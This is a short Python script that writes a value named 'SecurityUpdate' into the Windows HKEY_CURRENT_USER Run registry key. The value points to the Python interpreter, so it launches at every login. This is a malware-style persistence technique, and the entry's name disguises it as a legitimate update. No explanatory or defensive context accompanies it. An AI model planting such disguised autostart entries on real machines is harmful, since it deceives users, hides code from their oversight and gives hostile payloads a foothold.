import winreg
import os
import sys

key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, r"Software\Microsoft\Windows\CurrentVersion\Run", 0, winreg.KEY_WRITE)
winreg.SetValueEx(key, "SecurityUpdate", 0, winreg.REG_SZ, sys.executable)
winreg.CloseKey(key)
